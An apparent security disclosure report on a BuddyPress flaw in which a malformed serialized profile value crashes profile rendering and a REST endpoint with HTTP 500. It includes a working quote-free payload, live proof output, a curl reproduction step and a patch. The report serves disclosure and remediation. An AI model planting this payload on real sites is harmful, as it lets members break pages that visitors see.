# BuddyPress — unchecked `unserialize()` in `bp_unserialize_profile_field()` lets any member fatal their own profile surfaces (uncaught TypeError → HTTP 500)

**Plugin:** BuddyPress (in scope — officially maintained)
**Version tested:** `15.0.0-alpha` (trunk, `github.com/buddypress/BuddyPress` @ `4af6c90`)
**File:** `src/bp-xprofile/bp-xprofile-template.php` → `bp_unserialize_profile_field()`
**Class:** CWE-248 (uncaught exception) / CWE-502-adjacent (unvalidated `unserialize` result)
**Privilege required:** Subscriber (`read`, `level_0` only) — editing their **own** profile field
**Verified:** live WordPress 7.1 + PHP 8.4.19; unauthenticated HTTP 500 reproduced, with a control.

## The bug

```php
function bp_unserialize_profile_field( $value ) {
    if ( is_serialized( $value ) ) {
        $field_value = @unserialize( $value );
        $field_value = implode( ', ', $field_value );   // <-- $field_value may be false
        return $field_value;
    }
    return $value;
}
```

`is_serialized()` is a **pattern** check; `unserialize()` is a **parse**. They disagree. A value
that looks serialized but does not parse makes `unserialize()` return `false`, and on PHP 8
`implode(', ', false)` throws `TypeError: implode(): Argument #2 ($array) must be of type ?array,
false given` — an uncaught fatal.

**Payload:** `a:99:{i:0;i:1;}` — declares 99 elements, supplies one.
`is_serialized()` → `true`, `unserialize()` → `false`. It contains **no quotes**, which matters:
the xProfile save chain runs `addslashes`-style escaping (via the kses filters), so a quoted
payload such as `O:14:"…"` is stored as `O:14:\"…\"` and is mangled. A quote-free payload passes
through byte-for-byte.

## Proof (live)

Acting as the **subscriber** account, writing only its own profile field:

```
acting_as: subscriber
stored_value: 'a:99:{i:0;i:1;}'
is_serialized: TRUE
unserialize_result: false
DISPLAY_FATAL: *** TypeError: implode(): Argument #2 ($array) must be of type ?array, false given ***
```

Same fatal via the profile-view template path (`bp_get_the_profile_field_value()`, which calls
`bp_unserialize_profile_field()` on `$field->data->value`):

```
PROFILE_PAGE_FATAL: *** TypeError: implode(): Argument #2 ($array) must be of type ?array, false given ***
```

### Unauthenticated HTTP 500, with a control

Poisoning the **Name** field of user 5, then requesting the xProfile data endpoint with **no
cookies**:

```
=== WITH payload ===
/buddypress/v2/xprofile/1/data/5           HTTP:500
/buddypress/v2/members                     HTTP:200
=== after resetting the field to "Normal Name" ===
/buddypress/v2/xprofile/1/data/5           HTTP:200
/buddypress/v2/members                     HTTP:200
```

The 500 flips back to 200 when the payload is removed — causation established, not correlation.

## Scope — what I did and did NOT confirm

Being precise, because the control run disproved two things I initially suspected:

* **Confirmed:** `/buddypress/v2/xprofile/{field}/data/{user}` returns 500 for the poisoned user
  (unauthenticated), and the profile-view template path throws the same fatal. Root cause is one
  function with three call sites (`bp-xprofile-template.php:617`,
  `bp-xprofile-functions.php:708` via `xprofile_format_profile_field()`, and
  `class-bp-xprofile-fields-rest-controller.php:842`).
* **NOT site-wide:** the members **list** endpoint `/buddypress/v2/members` returned 200 both with
  and without the payload. I am not claiming a directory-wide outage.
* **NOT caused by this bug:** `/buddypress/v2/members/5` returned 500 *both* with and without the
  payload — a pre-existing unrelated error in my lab. Explicitly excluded from this report.
* **NOT object injection.** I tested it: an `O:…` payload is stored slashed
  (`O:14:\"BP_POI_Canary\"…`), so `unserialize()` fails and no object is instantiated. The
  save-path `maybe_unserialize()` in `xprofile_sanitize_data_value_before_save()` and the
  display-path `unserialize()` both lack `allowed_classes => false`, which is worth hardening,
  but with the slashing in place I could **not** reach object instantiation and I am not claiming
  RCE.

**Severity:** low-to-moderate. Any registered member can persistently break their own profile
field rendering and its REST representation, observable by unauthenticated visitors. It is a
stored, self-inflicted-surface DoS, not privilege escalation and not code execution.

## Fix

Validate the parse result before using it:

```php
function bp_unserialize_profile_field( $value ) {
    if ( is_serialized( $value ) ) {
        $field_value = @unserialize( $value, array( 'allowed_classes' => false ) );
        if ( ! is_array( $field_value ) ) {
            return is_scalar( $field_value ) ? (string) $field_value : '';
        }
        return implode( ', ', $field_value );
    }
    return $value;
}
```

`allowed_classes => false` additionally closes the object-instantiation surface as
defence-in-depth (Secure Custom Fields already does this in
`includes/acf-helper-functions.php:607`; BuddyPress does not).

## Reproduce

```
# BuddyPress active with the xprofile component; run as any member:
wp eval-file poc/t_bp_dos.php --allow-root     # -> DISPLAY_FATAL TypeError
# then, unauthenticated:
curl -s -o /dev/null -w "%{http_code}\n" "http://<site>/?rest_route=/buddypress/v2/xprofile/1/data/<user_id>"
```

`poc/t_bp_poi.php` is the object-injection attempt that the slashing defeats — kept so the
negative result is reproducible too.
